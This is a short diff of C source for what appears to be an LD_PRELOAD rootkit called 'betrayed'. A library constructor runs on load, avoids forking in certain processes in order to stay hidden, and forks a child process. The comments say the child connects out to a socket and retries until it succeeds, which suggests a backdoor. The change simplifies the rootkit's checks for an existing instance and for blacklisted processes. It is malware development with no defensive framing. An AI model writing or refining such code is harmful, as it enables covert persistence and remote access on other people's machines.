@@ -32,15 +32,10 @@
 void __attribute ((constructor)) binit (void)
 {
     /* don't try to fork if we've already got an instance running.
-     * that would be bad news. i was doing this check in the fork,
-     * and killing ourselves if there was an instance already, but
-     * i realised that was silly. */
-    if(is_betrayed_alive()) return;
-
+     * that would be bad news. */
     /* we specifically need to not fork off of some processes in order
      * to stay hidden. */
-    int i;
-    for(i=0; i<sizeof(bad_bins)/sizeof(bad_bins[0]); i++) if(is_bad_proc(cprocname(),bad_bins[i])) return;
+    if(is_betrayed_alive() || is_bad_proc(cprocname())) return;
 
     /* in case you don't care about being root/hiding the process...
      * i was also doing this check once the process had been forked,
@@ -54,7 +49,7 @@ void __attribute ((constructor)) binit (void)
     if(pid==0){
 
         setpgrp(); // we our own being
-        
+
         /* make socket, connect to socket. exit(0) if we can't connect.
          * every new process will attempt to connect until a successful
          * connection is made.
